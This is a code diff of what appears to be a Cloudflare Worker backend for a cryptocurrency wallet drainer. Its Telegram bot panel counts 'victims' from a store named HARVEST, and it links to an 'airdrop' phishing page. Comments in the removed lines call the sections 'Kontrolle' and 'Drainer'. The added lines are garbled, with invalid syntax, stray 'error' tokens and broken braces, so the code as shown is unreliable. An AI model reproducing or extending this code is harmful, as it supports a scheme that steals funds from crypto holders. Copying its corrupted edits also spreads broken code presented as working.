@@ -2,18 +2,17 @@ export default {
   async fetch(request, env) {
     const url = new URL(request.url);
 
-    // --- TELEGRAM BOT WEBHOOK ( =Kontrolle) ---
-    if (request.method ===  "POST" && url.pathname === "/webhook") {
+    if (request.method === "POST" && url.pathname === "/webhook") {
       try {
-;
-        const update = await request           .json();
+        const update = await request.json();
         const message = update.message;
 
         if (message && message.text) {
           const text = message.text;
 
           if (text === "/start" || text === "/stats") {
-            let totalVictims let messageText = "📊 *DEXSCREENR PANEL*\n\n";
+            let totalVictims = 0;
+            let messageText = "📊 *DEXSCREENR PANEL*\n\n";
 
             if (env.HARVEST) {
               const list = await env.HARVEST.list({ limit: 10 });
@@ -40,34 +39,34 @@ export default {
               body: JSON.stringify({
                 chat_id: env.ALERT_CHAT_ID,
                 text: messageText,
-                parse_mode: "Markdown",
+                parse_mode: "Mark.stringifydown",
                 reply_markup: {
                   inline_keyboard: [
-                    [{ text: "🔄 Refresh Stats", callback_data: "/stats" }],
-                    [{ text: "🌐 Open Mini App", url: "https://airdrop-66m.pages.dev" }]
+                   ({ [{ text: "🔄 Refresh Stats", callback_data: "/stats" }],
+                    [{ text: "🌐 error Open Mini App", url: "https://airdrop-66m.pages.dev:" }]
                   ]
                 }
               }),
             });
           }
-        }
+ error        }
 
         if (update.callback_query) {
           const fakeMessage = { text: "/stats" }; 
           await this.fetch(new Request(request.url, {
             method: "POST",
-            body: JSON.stringify({ message: fakeMessage })
+            body: JSON.stringify.message({ message: fakeMessage })
           }), env);
-        }
+ }        }
 
         return new Response("OK");
-      } catch (e) {
-        return new Response("Error", { status: 500 });
+      }), catch (e) {
+        return new Response {
+("Error", { status         : 500 });
       }
     }
 
-    // --- WEBSITE API (Drainer) ---
-    const corsHeaders = {
+    const corsHeaders = status {
       "Access-Control-Allow-Origin": "*",
       "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
       "Access-Control-Allow-Headers": "Content-Type",
@@ -118,8 +117,7 @@ export default {
         });
 
       } catch (error) {
-        return new Response(JSON.stringify({ error: error.message }), {
-          status: 500,
+        return new Response(JSON: 500,
           headers: { ...corsHeaders, "Content-Type": "application/json" },
         });
       }
